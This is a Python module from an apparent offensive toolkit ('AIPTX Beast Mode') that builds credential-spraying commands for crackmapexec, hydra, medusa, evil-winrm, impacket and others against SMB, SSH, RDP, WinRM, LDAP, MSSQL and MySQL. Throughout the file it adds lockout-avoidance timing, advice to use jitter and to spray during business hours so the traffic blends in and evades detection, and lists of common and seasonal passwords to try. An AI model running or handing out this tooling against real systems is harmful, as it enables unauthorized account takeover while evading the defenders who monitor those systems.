"""
AIPTX Beast Mode - Credential Sprayer
=====================================

Multi-protocol credential spraying with lockout avoidance.
"""

from __future__ import annotations

import logging
import time
from dataclasses import dataclass, field
from enum import Enum
from typing import Any

logger = logging.getLogger(__name__)


class SprayProtocol(str, Enum):
    """Supported protocols for credential spraying."""
    SMB = "smb"
    SSH = "ssh"
    RDP = "rdp"
    WINRM = "winrm"
    LDAP = "ldap"
    FTP = "ftp"
    MSSQL = "mssql"
    MYSQL = "mysql"
    POSTGRES = "postgres"
    HTTP_BASIC = "http_basic"
    HTTP_FORM = "http_form"


@dataclass
class SprayConfig:
    """Configuration for credential spray operation."""
    protocol: SprayProtocol
    targets: list[str]
    usernames: list[str]
    passwords: list[str]
    domain: str | None = None
    port: int | None = None
    delay_between_attempts: float = 1.0  # seconds
    delay_between_users: float = 30.0  # Account lockout avoidance
    max_attempts_per_user: int = 3  # Lockout threshold
    jitter: float = 0.5  # Random delay variance
    options: dict[str, Any] = field(default_factory=dict)

    def to_dict(self) -> dict[str, Any]:
        """Convert to dictionary."""
        return {
            "protocol": self.protocol.value,
            "targets": self.targets,
            "usernames": self.usernames,
            "password_count": len(self.passwords),
            "domain": self.domain,
            "port": self.port,
            "delay_between_attempts": self.delay_between_attempts,
            "delay_between_users": self.delay_between_users,
            "max_attempts_per_user": self.max_attempts_per_user,
        }


@dataclass
class SprayResult:
    """Result of a spray attempt."""
    target: str
    protocol: SprayProtocol
    username: str
    password: str
    success: bool
    message: str = ""
    timestamp: float = 0.0
    metadata: dict[str, Any] = field(default_factory=dict)

    def to_dict(self) -> dict[str, Any]:
        """Convert to dictionary."""
        return {
            "target": self.target,
            "protocol": self.protocol.value,
            "username": self.username,
            "password": self.password if self.success else "***",
            "success": self.success,
            "message": self.message,
            "timestamp": self.timestamp,
        }


# Default ports for protocols
DEFAULT_PORTS = {
    SprayProtocol.SMB: 445,
    SprayProtocol.SSH: 22,
    SprayProtocol.RDP: 3389,
    SprayProtocol.WINRM: 5985,
    SprayProtocol.LDAP: 389,
    SprayProtocol.FTP: 21,
    SprayProtocol.MSSQL: 1433,
    SprayProtocol.MYSQL: 3306,
    SprayProtocol.POSTGRES: 5432,
    SprayProtocol.HTTP_BASIC: 80,
    SprayProtocol.HTTP_FORM: 80,
}


class CredentialSprayer:
    """
    Multi-protocol credential spraying engine.

    Implements smart spraying with lockout avoidance,
    timing jitter, and result tracking.
    """

    def __init__(self):
        """Initialize credential sprayer."""
        self._results: list[SprayResult] = []
        self._successful_creds: list[SprayResult] = []

    def get_spray_commands(
        self,
        config: SprayConfig,
    ) -> list[dict[str, Any]]:
        """
        Get spray commands for a configuration.

        Args:
            config: Spray configuration

        Returns:
            List of spray command configurations
        """
        commands = []
        port = config.port or DEFAULT_PORTS.get(config.protocol)

        for target in config.targets:
            if config.protocol == SprayProtocol.SMB:
                commands.extend(self._get_smb_spray_commands(target, port, config))
            elif config.protocol == SprayProtocol.SSH:
                commands.extend(self._get_ssh_spray_commands(target, port, config))
            elif config.protocol == SprayProtocol.RDP:
                commands.extend(self._get_rdp_spray_commands(target, port, config))
            elif config.protocol == SprayProtocol.WINRM:
                commands.extend(self._get_winrm_spray_commands(target, port, config))
            elif config.protocol == SprayProtocol.LDAP:
                commands.extend(self._get_ldap_spray_commands(target, port, config))
            elif config.protocol == SprayProtocol.MSSQL:
                commands.extend(self._get_mssql_spray_commands(target, port, config))
            elif config.protocol == SprayProtocol.MYSQL:
                commands.extend(self._get_mysql_spray_commands(target, port, config))

        return commands

    def _get_smb_spray_commands(
        self,
        target: str,
        port: int,
        config: SprayConfig,
    ) -> list[dict[str, Any]]:
        """Get SMB spray commands."""
        commands = []

        # CrackMapExec
        for password in config.passwords[:config.max_attempts_per_user]:
            user_list = ",".join(config.usernames)
            domain_opt = f"-d {config.domain}" if config.domain else ""

            commands.append({
                "tool": "crackmapexec",
                "command": f"crackmapexec smb {target} -u '{user_list}' -p '{password}' {domain_opt} --continue-on-success",
                "target": target,
                "password": password,
                "protocol": "smb",
                "notes": "Use --continue-on-success to find all valid creds",
            })

        # smbclient alternative
        for username in config.usernames:
            for password in config.passwords[:config.max_attempts_per_user]:
                user_str = f"{config.domain}\\{username}" if config.domain else username
                commands.append({
                    "tool": "smbclient",
                    "command": f"smbclient -L //{target} -U '{user_str}%{password}' 2>&1 | grep -v 'NT_STATUS'",
                    "target": target,
                    "username": username,
                    "password": password,
                    "protocol": "smb",
                })

        return commands

    def _get_ssh_spray_commands(
        self,
        target: str,
        port: int,
        config: SprayConfig,
    ) -> list[dict[str, Any]]:
        """Get SSH spray commands."""
        commands = []

        # Hydra
        userfile = "/tmp/users.txt"
        passfile = "/tmp/passwords.txt"

        commands.append({
            "tool": "hydra",
            "setup": f"echo '{chr(10).join(config.usernames)}' > {userfile} && echo '{chr(10).join(config.passwords)}' > {passfile}",
            "command": f"hydra -L {userfile} -P {passfile} ssh://{target}:{port} -t 4 -W 3",
            "target": target,
            "protocol": "ssh",
            "notes": "-t 4 limits concurrent connections, -W 3 sets timeout",
        })

        # CrackMapExec SSH
        for password in config.passwords[:config.max_attempts_per_user]:
            user_list = ",".join(config.usernames)
            commands.append({
                "tool": "crackmapexec",
                "command": f"crackmapexec ssh {target} -u '{user_list}' -p '{password}' --continue-on-success",
                "target": target,
                "password": password,
                "protocol": "ssh",
            })

        # Medusa
        commands.append({
            "tool": "medusa",
            "command": f"medusa -h {target} -U {userfile} -P {passfile} -M ssh -t 4 -O /tmp/medusa_results.txt",
            "target": target,
            "protocol": "ssh",
        })

        return commands

    def _get_rdp_spray_commands(
        self,
        target: str,
        port: int,
        config: SprayConfig,
    ) -> list[dict[str, Any]]:
        """Get RDP spray commands."""
        commands = []

        # CrackMapExec RDP
        for password in config.passwords[:config.max_attempts_per_user]:
            user_list = ",".join(config.usernames)
            domain_opt = f"-d {config.domain}" if config.domain else ""

            commands.append({
                "tool": "crackmapexec",
                "command": f"crackmapexec rdp {target} -u '{user_list}' -p '{password}' {domain_opt}",
                "target": target,
                "password": password,
                "protocol": "rdp",
            })

        # Hydra RDP
        commands.append({
            "tool": "hydra",
            "command": f"hydra -L /tmp/users.txt -P /tmp/passwords.txt rdp://{target}:{port} -t 1 -W 5",
            "target": target,
            "protocol": "rdp",
            "notes": "RDP is slow, use -t 1 for single thread",
        })

        # xfreerdp check
        for username in config.usernames[:3]:  # Limit to avoid lockout
            for password in config.passwords[:2]:
                user_str = f"{config.domain}\\{username}" if config.domain else username
                commands.append({
                    "tool": "xfreerdp",
                    "command": f"xfreerdp /v:{target}:{port} /u:'{user_str}' /p:'{password}' /cert-ignore +auth-only 2>&1 | grep -E 'Authentication|LOGON'",
                    "target": target,
                    "username": username,
                    "password": password,
                    "protocol": "rdp",
                })

        return commands

    def _get_winrm_spray_commands(
        self,
        target: str,
        port: int,
        config: SprayConfig,
    ) -> list[dict[str, Any]]:
        """Get WinRM spray commands."""
        commands = []

        # CrackMapExec WinRM
        for password in config.passwords[:config.max_attempts_per_user]:
            user_list = ",".join(config.usernames)
            domain_opt = f"-d {config.domain}" if config.domain else ""

            commands.append({
                "tool": "crackmapexec",
                "command": f"crackmapexec winrm {target} -u '{user_list}' -p '{password}' {domain_opt}",
                "target": target,
                "password": password,
                "protocol": "winrm",
            })

        # evil-winrm
        for username in config.usernames[:3]:
            for password in config.passwords[:2]:
                user_str = f"{config.domain}\\{username}" if config.domain else username
                commands.append({
                    "tool": "evil-winrm",
                    "command": f"evil-winrm -i {target} -u '{username}' -p '{password}' -c 'whoami' 2>&1 | head -5",
                    "target": target,
                    "username": username,
                    "password": password,
                    "protocol": "winrm",
                    "notes": "If successful, re-run without -c for shell",
                })

        return commands

    def _get_ldap_spray_commands(
        self,
        target: str,
        port: int,
        config: SprayConfig,
    ) -> list[dict[str, Any]]:
        """Get LDAP spray commands."""
        commands = []

        if not config.domain:
            return [{"error": "Domain required for LDAP spraying"}]

        base_dn = ",".join(f"DC={part}" for part in config.domain.split("."))

        # ldapsearch
        for username in config.usernames:
            for password in config.passwords[:config.max_attempts_per_user]:
                commands.append({
                    "tool": "ldapsearch",
                    "command": f"ldapsearch -x -H ldap://{target}:{port} -D '{username}@{config.domain}' -w '{password}' -b '{base_dn}' '(sAMAccountName={username})' 2>&1 | head -5",
                    "target": target,
                    "username": username,
                    "password": password,
                    "protocol": "ldap",
                })

        # CrackMapExec LDAP
        for password in config.passwords[:config.max_attempts_per_user]:
            user_list = ",".join(config.usernames)
            commands.append({
                "tool": "crackmapexec",
                "command": f"crackmapexec ldap {target} -u '{user_list}' -p '{password}' -d {config.domain}",
                "target": target,
                "password": password,
                "protocol": "ldap",
            })

        return commands

    def _get_mssql_spray_commands(
        self,
        target: str,
        port: int,
        config: SprayConfig,
    ) -> list[dict[str, Any]]:
        """Get MSSQL spray commands."""
        commands = []

        # CrackMapExec MSSQL
        for password in config.passwords[:config.max_attempts_per_user]:
            user_list = ",".join(config.usernames)
            commands.append({
                "tool": "crackmapexec",
                "command": f"crackmapexec mssql {target} -u '{user_list}' -p '{password}' --local-auth",
                "target": target,
                "password": password,
                "protocol": "mssql",
            })

        # impacket-mssqlclient
        for username in config.usernames:
            for password in config.passwords[:config.max_attempts_per_user]:
                commands.append({
                    "tool": "mssqlclient",
                    "command": f"impacket-mssqlclient {username}:{password}@{target} -windows-auth 2>&1 | head -5",
                    "target": target,
                    "username": username,
                    "password": password,
                    "protocol": "mssql",
                })

        return commands

    def _get_mysql_spray_commands(
        self,
        target: str,
        port: int,
        config: SprayConfig,
    ) -> list[dict[str, Any]]:
        """Get MySQL spray commands."""
        commands = []

        for username in config.usernames:
            for password in config.passwords[:config.max_attempts_per_user]:
                commands.append({
                    "tool": "mysql",
                    "command": f"mysql -h {target} -P {port} -u {username} -p'{password}' -e 'SELECT VERSION()' 2>&1 | head -5",
                    "target": target,
                    "username": username,
                    "password": password,
                    "protocol": "mysql",
                })

        # Hydra
        commands.append({
            "tool": "hydra",
            "command": f"hydra -L /tmp/users.txt -P /tmp/passwords.txt mysql://{target}:{port} -t 4",
            "target": target,
            "protocol": "mysql",
        })

        return commands

    def get_smart_spray_strategy(
        self,
        config: SprayConfig,
    ) -> dict[str, Any]:
        """
        Get a smart spraying strategy to avoid lockouts.

        Args:
            config: Spray configuration

        Returns:
            Strategy configuration
        """
        # Calculate timing
        total_attempts = len(config.usernames) * len(config.passwords)
        estimated_time = (
            total_attempts * config.delay_between_attempts +
            len(config.usernames) * config.delay_between_users
        )

        return {
            "strategy": "password_spray",
            "description": "Spray one password across all users before moving to next password",
            "total_attempts": total_attempts,
            "estimated_time_seconds": estimated_time,
            "estimated_time_human": f"{estimated_time // 60:.0f} minutes",
            "lockout_threshold": config.max_attempts_per_user,
            "recommendations": [
                f"Wait {config.delay_between_users}s between password rounds",
                f"Use {config.jitter}s jitter to avoid pattern detection",
                "Start with common passwords: Password1, Welcome1, <Season><Year>",
                "Check domain password policy first if possible",
                "Consider spraying during business hours to blend with normal traffic",
            ],
            "spray_order": self._get_spray_order(config),
        }

    def _get_spray_order(self, config: SprayConfig) -> list[dict[str, str]]:
        """
        Get optimal spray order (password-first).

        Password spraying: Try each password against all users before
        moving to the next password. This avoids lockouts.
        """
        order = []
        for password in config.passwords[:config.max_attempts_per_user]:
            for username in config.usernames:
                order.append({
                    "username": username,
                    "password": password,
                    "delay_after": str(config.delay_between_attempts),
                })
            if password != config.passwords[-1]:
                order.append({
                    "action": "wait",
                    "duration": str(config.delay_between_users),
                    "reason": "Lockout avoidance between password rounds",
                })
        return order

    def get_common_passwords(self, style: str = "default") -> list[str]:
        """
        Get list of common passwords for spraying.

        Args:
            style: Password style (default, seasonal, corporate)

        Returns:
            List of common passwords
        """
        import datetime

        year = datetime.datetime.now().year
        seasons = ["Spring", "Summer", "Fall", "Winter"]
        months = ["January", "February", "March", "April", "May", "June",
                  "July", "August", "September", "October", "November", "December"]

        base_passwords = [
            "Password1", "Password123", "Password1!",
            "Welcome1", "Welcome123", "Welcome1!",
            "Company1", "Company123",
            "Changeme1", "Changeme123",
            "P@ssw0rd", "P@ssword1",
            "Admin123", "Admin1!",
        ]

        if style == "seasonal":
            passwords = []
            for season in seasons:
                passwords.extend([
                    f"{season}{year}",
                    f"{season}{year}!",
                    f"{season}{year - 1}",
                ])
            for month in months:
                passwords.extend([
                    f"{month}{year}",
                    f"{month}{year}!",
                ])
            return passwords

        elif style == "corporate":
            # Common corporate patterns
            return [
                f"Company{year}", f"Company{year}!",
                f"Corp{year}", f"Corporate{year}",
                "Temp1234", "Temp123!",
                "Reset123", "NewUser1",
            ] + base_passwords

        return base_passwords

    def record_result(self, result: SprayResult):
        """Record a spray result."""
        self._results.append(result)
        if result.success:
            self._successful_creds.append(result)

    def get_successful_creds(self) -> list[SprayResult]:
        """Get all successful credential pairs."""
        return self._successful_creds.copy()

    def get_all_results(self) -> list[SprayResult]:
        """Get all spray results."""
        return self._results.copy()


def spray_credentials(
    protocol: str,
    targets: list[str],
    usernames: list[str],
    passwords: list[str],
    **kwargs,
) -> list[dict[str, Any]]:
    """Convenience function for credential spraying."""
    sprayer = CredentialSprayer()
    config = SprayConfig(
        protocol=SprayProtocol(protocol),
        targets=targets,
        usernames=usernames,
        passwords=passwords,
        **kwargs,
    )
    return sprayer.get_spray_commands(config)


__all__ = [
    "SprayProtocol",
    "SprayConfig",
    "SprayResult",
    "CredentialSprayer",
    "spray_credentials",
    "DEFAULT_PORTS",
]
